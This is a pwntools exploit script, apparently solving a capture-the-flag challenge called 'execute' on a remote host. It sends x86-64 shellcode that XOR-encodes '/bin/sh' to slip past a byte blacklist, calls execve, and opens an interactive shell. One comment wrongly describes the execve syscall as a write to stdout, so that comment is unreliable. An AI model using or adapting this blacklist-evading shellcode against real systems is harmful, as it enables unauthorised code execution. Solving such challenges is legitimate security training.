#!/usr/bin/env python3

from pwn import *

exe = ELF("./execute")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("94.237.49.212", 40097)

    return r


def main():
    r = conn()

    # blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"

    shellcode = asm("""
                    /* XOR on $rdi to get "/bin/sh" string */
                    movabs rdi, 0xff978cd091969dd0
                    xor rdi, 0xffffffffffffffff

                    /* Load address of string to $rdi */
                    push rdi
                    lea rdi, [rsp]

                    /* Syscall to write on stdout (always avoid bad bytes) */
                    mov rsi, 0x3a
                    inc rsi
                    mov rax, rsi
                    mov rsi, 0
                    mov rdx, 0
                    syscall
                """)

    r.sendlineafter(b"everything", shellcode)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
